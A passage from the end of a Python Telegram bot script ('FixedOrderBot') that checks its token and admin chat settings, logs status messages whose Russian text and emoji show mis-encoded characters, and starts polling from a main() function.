            logger.error("‚ùå –ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω BOT_TOKEN! –ü–æ–ª—É—á–∏—Ç–µ —Ç–æ–∫–µ–Ω —É @BotFather")
            return
        
        if ADMIN_CHAT_ID == "YOUR_CHAT_ID_HERE":
            logger.warning("‚ö†Ô∏è –ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω ADMIN_CHAT_ID. –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ—Ç–∫–ª—é—á–µ–Ω—ã.")
        
        # –ó–∞–ø—É—Å–∫ polling
        logger.info("üöÄ –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –±–æ—Ç –∑–∞–ø—É—â–µ–Ω –∏ –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!")
        self.application.run_polling()

def main():
    """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∑–∞–ø—É—Å–∫–∞ –±–æ—Ç–∞"""
    try:
        # –°–æ–∑–¥–∞–µ–º –∏ –∑–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞
        bot = FixedOrderBot(BOT_TOKEN, WEB_SERVER_URL)
        bot.run()
    except KeyboardInterrupt:
        logger.info("üõë –ë–æ—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –±–æ—Ç–∞: {e}")

if __name__ == "__main__":
    main()
